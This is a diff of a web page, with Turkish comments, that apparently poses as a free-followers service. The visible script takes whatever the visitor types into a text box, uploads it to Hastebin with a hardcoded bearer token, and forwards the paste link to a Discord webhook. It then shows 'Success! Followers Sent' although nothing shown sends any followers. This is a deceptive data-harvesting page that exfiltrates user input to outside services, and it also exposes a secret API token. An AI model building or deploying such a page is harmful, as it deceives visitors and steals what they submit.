@@ -106,31 +106,35 @@
     <button onclick="uploadText()">Send!</button>
 
     <div id="message-container">
-        <p>Succes! Followers Sent🎉</p>
+        <p>Success! Followers Sent🎉</p>
     </div>
 
     <script>
         function uploadText() {
             const text = document.getElementById("inputText").value;
             const url = "https://hastebin.com/documents";  // Hastebin API URL
+            const accessToken = '92ab74b3b9067c7eafdf57bdaaef222fadd96e53988dd8c17c597bc0d964acc2ca26079136e8d853037d8d0c841110000216a4324914d37a3f3eacc9616bc806';  // Buraya Hastebin API token'ınızı ekleyin
 
             // Metni JSON formatında gönder
             fetch(url, {
                 method: "POST",
                 body: JSON.stringify({ content: text }),
                 headers: {
-                    "Content-Type": "application/json"
+                    "Content-Type": "application/json",
+                    "Authorization": `Bearer ${accessToken}`  // Token'ı buraya ekliyoruz
                 }
             })
             .then(response => response.json())
             .then(data => {
-                const link = "https://hastebin.com/" + data.key;
+                if (data.key) {
+                    // Discord Webhook'a bağlantıyı gönder
+                    sendToDiscord(`https://hastebin.com/${data.key}`);
 
-                // Discord Webhook'a bağlantıyı gönder
-                sendToDiscord(link);
-
-                // Ekranda "Başarıyla gönderildi!" mesajı göster
-                document.getElementById("message-container").style.display = "block";
+                    // Ekranda "Başarıyla gönderildi!" mesajı göster
+                    document.getElementById("message-container").style.display = "block";
+                } else {
+                    alert("Bir hata oluştu: " + data.message);
+                }
             })
             .catch(error => {
                 alert("Bir hata oluştu: " + error);
